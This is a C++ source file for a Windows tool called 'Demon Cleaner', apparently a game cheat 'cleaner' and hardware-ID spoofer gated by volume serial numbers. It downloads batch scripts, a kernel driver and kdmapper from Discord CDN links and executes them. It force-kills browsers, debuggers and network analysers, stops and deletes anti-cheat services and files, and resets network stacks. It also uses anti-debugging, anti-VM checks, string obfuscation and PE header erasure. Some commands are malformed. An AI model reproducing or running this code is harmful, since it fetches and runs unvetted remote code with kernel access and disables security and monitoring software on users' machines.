#include <iostream>
#include "Headers/xorstr.hpp"
#include <string>
#include <windows.h>
#include <Urlmon.h>
#include "Headers/junk-code.h"
#include <Wininet.h>
#include <stdlib.h>
#include <vector>
#include <tchar.h>
#include "Headers/color.hpp"
#include "Headers/json.hpp"
#include <fstream>
#include "Headers/value.h"
#include <stringapiset.h>
#include <TlHelp32.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"Wininet.lib") 
using namespace junkcode;
#define JUNK_CODE_ONE        \
    __asm{push eax}            \
    __asm{xor eax, eax}        \
    __asm{setpo al}            \
    __asm{push edx}            \
    __asm{xor edx, eax}        \
    __asm{sal edx, 2}        \
    __asm{xchg eax, edx}    \
    __asm{pop edx}            \
    __asm{or eax, ecx}        \
    __asm{pop eax}
void startup();
inline int AddSubOne(int One, int Two)
{
    JUNK_CODE_ONE
        return ((One + Two) - 1);
}

void SizeOfImage()
{
    // Any unreasonably large value will work say for example 0x100000 or 100,000h
    __asm
    {
        mov eax, fs: [0x30]				// PEB
        mov eax, [eax + 0x0c]			 // PEB_LDR_DATA
        mov eax, [eax + 0x0c]			// InOrderModuleList
        mov dword ptr[eax + 20h], 20000h // SizeOfImage    
    }
}

#define JUNK_CODE_ONE        \
    __asm{push eax}            \
    __asm{xor eax, eax}        \
    __asm{setpo al}            \
    __asm{push edx}            \
    __asm{xor edx, eax}        \
    __asm{sal edx, 2}        \
    __asm{xchg eax, edx}    \
    __asm{pop edx}            \
    __asm{or eax, ecx}        \
    __asm{pop eax}





void apex()
{


    std::string apex = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114575800954941/apex.bat"));
    std::string apexpath = "C:\\Windows\\Vss\\Apex.bat";
    URLDownloadToFileA(NULL, apex.c_str(), apexpath.c_str(), 0, NULL);
    system("cd C:\\Windows\\Vss\\");
    system("Start C:\\Windows\\Vss\\Apex.bat");


}
void gta()
{


    std::string gta = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114574483918858/gta.bat"));
    std::string gtapath = "C:\\Windows\\Vss\\gta.bat";
    URLDownloadToFileA(NULL, gta.c_str(), gtapath.c_str(), 0, NULL);
    system("cd C:\\Windows\\Vss\\");
    system("Start C:\\Windows\\Vss\\gta.bat");

}
void fortnite()
{


    std::string fortnite = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114573007527946/Fortnite.bat"));
    std::string fortnitepath = "C:\\Windows\\Vss\\Fortnite.bat";
    URLDownloadToFileA(NULL, fortnite.c_str(), fortnitepath.c_str(), 0, NULL);
    system("cd C:\\Windows\\Vss\\");
    system("Start C:\\Windows\\Vss\\Fortnite.bat");
}
void fishingplanet()
{
    std::string fishingplanet = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114571648593931/fishing-planet.bat"));
    std::string fishingplanetpath = "C:\\Windows\\Vss\\Fishing-planet.bat";
    URLDownloadToFileA(NULL, fishingplanet.c_str(), fishingplanetpath.c_str(), 0, NULL);
    system("cd C:\\Windows\Vss\\");
    system("Start C:\\Windows\\Vss\\Fishing-planet.bat");

}
void cod()
{

    std::string cod = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114570369318962/Cold-Ware.bat"));
    std::string codpath = "C:\\Windows\\Vss\\Cold-Ware.bat";
    URLDownloadToFileA(NULL, cod.c_str(), codpath.c_str(), 0, NULL);
    system("cd C:\\Windows\\Vss\\");
    system("Start C:\\Windows\\Vss\\Cold-Ware.bat");


}


void cleaner() {

    system(XorStr("taskkill /F /IM CCleaner64.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM WargamingErrorMonitor.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM wargamingerrormonitor.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM WorldOfTanks.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM chrome.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM msedge.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM discord.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM firefox.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM brave.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM opera.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM EpicGamesLauncher.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM vmware-hostd.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM vmware-authd.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM vmnat.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM Spotify.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM wcg.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM UnrealCEFSubProcess.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM CEFProcess.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM CEFProcess.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM BEServices.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM BattleEye.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM epicgameslauncher.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM FortniteClient-Win64-Shipping_EAC.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM FortniteClient-Win64-Shipping.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM FortniteClient-Win64-Shipping_BE.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM FortniteLauncher.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM r5apex.exe 2>NULL").c_str());
    system(XorStr("del /F /IM C:\\Windows\\Capcom.sys 2>NULL").c_str());
    system(XorStr("del /F /IM del /f %temp%\* 2>NULL").c_str());
    system(XorStr("del /F /IM D:\\steam\\depotcache\\* 2>NULL").c_str());
    system(XorStr("del /F /IM C:\\Program Files (x86)\\EasyAntiCheat\\EasyAntiCheat.exe 2>NULL").c_str());
    system(XorStr("del /F /IM C:\\Program Files (x86)\\EasyAntiCheat\\EasyAntiCheat.sys 2>NULL").c_str());
    system(XorStr("del /F /IM C:\\Windows\\KsDumperDriver.sys 2>NULL").c_str());
    system(XorStr("del /F /IM C:\\Windows\\System32\\Capcom.sys 2>NULL").c_str());
    system(XorStr("del /F /IM C:\\Windows\\System32\KsDumperDriver.sys 2>NULL").c_str());
    system(XorStr("taskkill /F /IM openvpnserv.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM LockApp.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM vmware.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM openvpnserv.exe 2>NULL").c_str());
    system(XorStr("taskkill /f /im KsDumperClient.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im KsDumper.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im GameOverlayUI.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FolderChangesView.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im steamservice.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Lightshot.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im steamwebhelper.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im PerfWatson2.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im vmware-tray.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im ProcessHacker.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im procmon.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im YourPhone.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im idaq.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im wallpaper64.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im wallpaper32.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im OneDrive.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im uTorrent.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im helper.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im idaq64.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Wireshark.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Fiddler.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FiddlerEverywhere.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Xenos64.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im die.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Xenos.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Xenos32.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im de4dot.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Cheat Engine.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTP Debugger Windows Service (32 bit).exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im KsDumper.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im client.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im OllyDbg.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im x64dbg.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im x32dbg.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im EasyAntiCheat.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im BEService.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FACEIT.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im PnkBstrA.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im PnkBstrB.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Client.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FortniteClient-Win64-Shipping.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im EpicGamesLauncher.exe >nul 2>&1").c_str());
    system(XorStr("sc stop BEService >nul 2>&1").c_str());
    system(XorStr("sc delete BEService >nul 2>&1").c_str());
    system(XorStr("sc stop BEDaisy >nul 2>&1").c_str());
    system(XorStr("sc delete BEDaisy >nul 2>&1").c_str());
    system(XorStr("sc stop EasyAntiCheat >nul 2>&1").c_str());
    system(XorStr("sc stop EasyAntiCheatSys >nul 2>&1").c_str());
    system(XorStr("sc delete EasyAntiCheat >nul 2>&1").c_str());
    system(XorStr("sc delete EasyAntiCheatSys >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FortniteLauncher.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im RiotClientServices.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im VALORANT.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im RainbowSix.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im csgo.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im RainbowSix_BE.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
    system(XorStr("sc stop HTTPDebuggerPro >nul 2>&1").c_str());
    system(XorStr("sc delete HTTPDebuggerPro >nul 2>&1").c_str());
    system(XorStr("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1").c_str());

}
void deleter()
{


    //delete the files we downloaded
    system("cd C:\\Windows\Vss\\");
    system(XorStr("del C:\\Windows\\Vss\\woof.sys").c_str());
    system(XorStr("del C:\\Windows\\Vss\\mapper.exe").c_str());
    system(XorStr("del C:\\Windows\\Vss\\Cold-Ware.bat").c_str());
    system(XorStr("del C:\\Windows\\Vss\\Fishing-Planet.bat").c_str());
    system(XorStr("del C:\\Windows\\Vss\\Apex.bat").c_str());
    system(XorStr("del C:\\Windows\\Vss\\gta.bat").c_str());
    system(XorStr("del C:\\Windows\\Vss\\Fortnite.bat").c_str());

    
}

void safeshutdown()
{

    system(XorStr("cls").c_str());
    rydekem();
    plvbjwh();
    tlmisir();
    akfuxnl();
    lnttirs();
    string a;
    std::cout << RED << "\nunloading kernel modules";
    Sleep(3500);
    std::cout << MAGENTA << "\nunloading resources";
    Sleep(1450);
    std::cout << CYAN << "\nunloading from memory";
    Sleep(2400);
    system(XorStr("cls").c_str());
    std::cout << "Do you want to restart your pc? \nYes/No : ";
    cin >> a;
    if (GetAsyncKeyState(VK_END))
    {
        MessageBoxA(NULL, "congratualtions. you got the ( finder ) role on our discord.", "congratulations", MB_OKCANCEL);
        safeshutdown();
    }
    if (GetAsyncKeyState(VK_DELETE))
    {
        MessageBoxA(NULL, "congratualtions. you got the ( exiter ) role on our discord.", "congratulations", MB_OKCANCEL);
        safeshutdown();
    }
    if (GetAsyncKeyState(VK_INSERT))
    {
        MessageBoxA(NULL, "congratualtions. you got the ( inserter ) role on our discord.", "congratulations", MB_OKCANCEL);
        safeshutdown();
    }
    if (a == "Yes" || a == "yes")
    {
        system(XorStr("shutdown -r").c_str());
        exit(0);
    }

    else
    {
        exit(0);
        return exit(0);
    }


}
void driverdetect()
{
    const TCHAR* devices[] = {
_T("\\\\.\\Dumper"),
_T("\\\\.\\KsDumper")
    };

    WORD iLength = sizeof(devices) / sizeof(devices[0]);
    for (int i = 0; i < iLength; i++)
    {
        HANDLE hFile = CreateFile(devices[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        TCHAR msg[256] = _T("");
        if (hFile != INVALID_HANDLE_VALUE) {
            system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO KsDumper Detected. && TIMEOUT 10 >nul").c_str());
            SetLastError(1);
            exit(0);
        }
        else
        {

        }
    }
}

void spoofer()
{
    rydekem();
    plvbjwh();
    tlmisir();
    akfuxnl();
    lnttirs();



    string spoofer = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/881227464498630677/NewWoof.sys"));
    string spooferpath = "C:\\Windows\\Vss\\woof.sys"; 
    URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);

    string mapper = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/879745681294786600/kdmapper.exe"));
    string mapperpath = "C:\\Windows\\Vss\\mapper.exe";
    URLDownloadToFileA(NULL, mapper.c_str(), mapperpath.c_str(), 0, NULL);
    system("cd C:\\Windows\\Vss\\");
    system("C:\\Windows\\Vss\\mapper.exe C:\\Windows\\Vss\\woof.sys");
    Sleep(2000);
    deleter();
    Sleep(2000);
    rydekem();
    plvbjwh();

    akfuxnl();
    lnttirs();
    system(XorStr("NETSH WINSOCK RESET").c_str());
    system(XorStr("NETSH INT IP RESET").c_str());
    system(XorStr("NETSH INTERFACE IPV4 RESET").c_str());
    system(XorStr("NETSH INTERFACE IPV6 RESET").c_str());
    system(XorStr("NETSH INTERFACE TCP RESET").c_str());
    system(XorStr("IPCONFIG /RELEASE").c_str());
    system(XorStr("IPCONFIG /RELEASE").c_str());
    system(XorStr("IPCONFIG /RENEW").c_str());
    system(XorStr("IPCONFIG /FLUSHDNS").c_str());
    system(XorStr("IPCONFIG /RENEW").c_str());
    system(XorStr("cls").c_str());
    safeshutdown();
}

void setcolor(unsigned short color)
{

    HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hcon, color);
}
string replaceAll(string subject, const string& search,
    const string& replace) {
    size_t pos = 0;
    while ((pos = subject.find(search, pos)) != string::npos) {
        subject.replace(pos, search.length(), replace);
        pos += replace.length();
    }
    return subject;
}



vector<string> serial;

void loadserial()
{

    serial.push_back(XorStr("384604182").c_str());
    serial.push_back(XorStr("2953439145").c_str());
}

void mainbot()
{
    

    TCHAR volumeName[MAX_PATH + 1] = { 0 };
    TCHAR fileSystemName[MAX_PATH + 1] = { 0 };
    DWORD serialNumber = 0;
    DWORD maxComponentLen = 0;
    DWORD fileSystemFlags = 0;

    
    JUNK_CODE_ONE
    if (GetVolumeInformation(_T("C:\\"), volumeName, ARRAYSIZE(volumeName), &serialNumber, &maxComponentLen, &fileSystemFlags, fileSystemName, ARRAYSIZE(fileSystemName)));
    while (true)
    {
        JUNK_CODE_ONE
        if (find(serial.begin(), serial.end(), to_string(serialNumber)) != serial.end())
        {
            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
            JUNK_CODE_ONE
            SetConsoleTitle(_T("Demon Cleaner V1.0 [release build]"));
            setcolor(12);
            std::cout << " _| |___ _____ ___ ___ \n";
            std::cout << "| . | -_|     | . |   |\n";
            std::cout << "|___|___|_|_|_|___|_|_|\n";

            JUNK_CODE_ONE
            std::cout << "\n";

            system(XorStr("start http://demoncleaner.gq").c_str());
            std::cout << MAGENTA << "Demon Cleaner V1.0\n";
            Sleep(2000);
            std::cout << RED << "\nloading kernel modules...\n";
            Sleep(2000);
            std::cout << CYAN << "\nloading resources...\n";
            Sleep(1000);
            std::cout << GREEN << "\nloading in memory...";
            Sleep(2400);
            system(XorStr("cls").c_str());
            cleaner();
            fishingplanet();
            gta();
            apex();
            cod();
            fortnite();
            spoofer();
        }
        
        else
        {
            rydekem();
            plvbjwh();
            tlmisir();
            akfuxnl();
            lnttirs();
            system(XorStr("cls").c_str());
            std::cout << CYAN << "Sorry but you are not in our database or you are banned. " << std::endl;
            std::cout << GREEN << "serial : ";
            std::cout << serialNumber << std::endl;
            Sleep(3000);
            exit(0);

        }
        
    }
    
    
}


typedef NTSTATUS(NTAPI* pfnNtSetInformationThread)(
    _In_ HANDLE ThreadHandle,
    _In_ ULONG  ThreadInformationClass,
    _In_ PVOID  ThreadInformation,
    _In_ ULONG  ThreadInformationLength
    );
const ULONG ThreadHideFromDebugger = 0x11;

string build_date()
{
    return __DATE__;
}

string build_time()
{
    return __TIME__;
}
void otherthing()
{
    DWORD OldProtect = 0;

    // Get base address of module
    char* pBaseAddr = (char*)GetModuleHandle(NULL);

    // Change memory protection
    VirtualProtect(pBaseAddr, 4096, // Assume x86 page size
        PAGE_READWRITE, &OldProtect);

    // Erase the header
    ZeroMemory(pBaseAddr, 4096);

    __asm
    {
        mov eax, fs: [0x30]				// PEB
        mov eax, [eax + 0x0c]			 // PEB_LDR_DATA
        mov eax, [eax + 0x0c]			// InOrderModuleList
        mov dword ptr[eax + 20h], 20000h // SizeOfImage    
    }
}
void HideFromDebugger()
{
    rydekem();
    plvbjwh();
    tlmisir();
    akfuxnl();
    lnttirs();
    OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
        TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
        TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
        TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
    HMODULE hNtDll = LoadLibrary(TEXT("ntdll.dll"));
    pfnNtSetInformationThread NtSetInformationThread = (pfnNtSetInformationThread)
        GetProcAddress(hNtDll, "NtSetInformationThread");
    NTSTATUS status = NtSetInformationThread(GetCurrentThread(),
        ThreadHideFromDebugger, NULL, 0);
}



int main()
{
    
    rydekem();
    plvbjwh();
    tlmisir();
    akfuxnl();
    lnttirs();

    LPCWSTR windowName = L"x32dbg";
    LPCWSTR vmname = L"VMware Workstation";
    if (FindWindow(NULL, windowName))
    {
        rydekem();
        plvbjwh();
        tlmisir();
        akfuxnl();
        lnttirs();
        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);

    }
    if (FindWindow(NULL, vmname))
    {
        rydekem();
        plvbjwh();
        tlmisir();
        akfuxnl();
        lnttirs();
        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO VMware Workstation Detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);

    }
    if (IsDebuggerPresent())
    {
        rydekem();
        plvbjwh();
        tlmisir();
        akfuxnl();
        lnttirs();
        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO Debugger Detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }






    else
    {
        if (GetLastError != 0)
        {
            rydekem();
            plvbjwh();
            tlmisir();
            akfuxnl();
            lnttirs();
            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
            system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE Banned && ECHO You have been banned for using reverse engineering tools against our software. && TIMEOUT 10 >nul").c_str());
            exit(0);
        }

        else if (GetLastError == 0)
        {


            rydekem();
            plvbjwh();
            tlmisir();
            akfuxnl();
            lnttirs();
            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
            HideFromDebugger();
            driverdetect();
            build_date();
            build_time();
            loadserial();
            mainbot();

        }



    }
}

